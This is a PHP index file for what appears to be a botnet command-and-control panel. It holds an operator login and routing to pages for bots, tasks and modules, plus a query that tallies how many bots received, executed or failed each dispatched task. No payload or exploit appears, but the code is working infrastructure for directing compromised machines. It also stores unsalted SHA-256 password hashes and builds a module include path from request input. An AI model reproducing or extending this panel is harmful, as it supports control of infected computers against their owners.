<?php

$in_script = true;

include_once('includes/sql.php');
include_once('includes/user.php');
include_once('includes/config.php');
include_once('includes/install.php');

// Update stats

$stmt = db_query("SELECT `id` FROM `tasks`");

while ($row = $stmt->fetch())
	db_query("UPDATE `tasks` SET `received` = (SELECT COUNT(`id`) FROM `senttasks` WHERE `tid` = `tasks`.`id`), `executed` = (SELECT COUNT(`id`) FROM `senttasks` WHERE `status` = 1 AND `tid` = `tasks`.`id`), `failed` = (SELECT COUNT(`id`) FROM `senttasks` WHERE `status` IS NULL AND `tid` = `tasks`.`id`) WHERE `uid` IS NULL OR `uid` = :1", getUID());

if (!isLoggedIn())
{
	if ($_POST && isset($_POST['user']) && isset($_POST['pass']))
	{
		$stmt = db_query("SELECT `id` FROM `users` WHERE `user` = :1 AND `pass` = :2", $_POST['user'], hash('sha256', $_POST['pass']));
		
		if ($stmt->rowCount() > 0)
		{
			$row = $stmt->fetch();
			$_SESSION['uid'] = $row['id'];
			header("Location: index.php");
		}
		else $TEMPLATE['alert'] = infoMsg("Wrong username or password!");
	}
	
	include_once("template/login.php");
}
else
{
	if 	   (isset($_GET['p']) && $_GET['p'] == "bots") 	include_once('pages/bots.php');
	elseif (isset($_GET['p']) && $_GET['p'] == "stats") include_once('pages/stats.php');
	elseif (isset($_GET['p']) && $_GET['p'] == "tasks") include_once('pages/tasks.php');
	elseif (isset($_GET['p']) && $_GET['p'] == "users") include_once('pages/users.php');
	elseif (isset($_GET['p']) && $_GET['p'] == "debug") include_once('pages/debug.php');
	elseif (isset($_GET['p']) && $_GET['p'] == "changelog") include_once('pages/changelog.php');
	elseif (isset($_GET['p']) && $_GET['p'] == "settings") include_once('pages/settings.php');
	elseif (isset($_GET['p']) && $_GET['p'] == "module")
	{
		if (getRole() > 2)
		{
			$TEMPLATE['site'] = "Modules";
			$TEMPLATE['text'] = infoMsg("You don't have permission to see this page.");
			$TEMPLATE['js'] = '';
		}
		else include_once('modules/'.str_replace(array('\\', '/'), '', $_GET['m']).'/page.php');
	}
	elseif (isset($_GET['p']) && $_GET['p'] == "logout")
	{
		session_destroy();
		header("Location: index.php");
	}
	else include_once('pages/stats.php');
	
	include_once("template/main.php");
}

die();

?>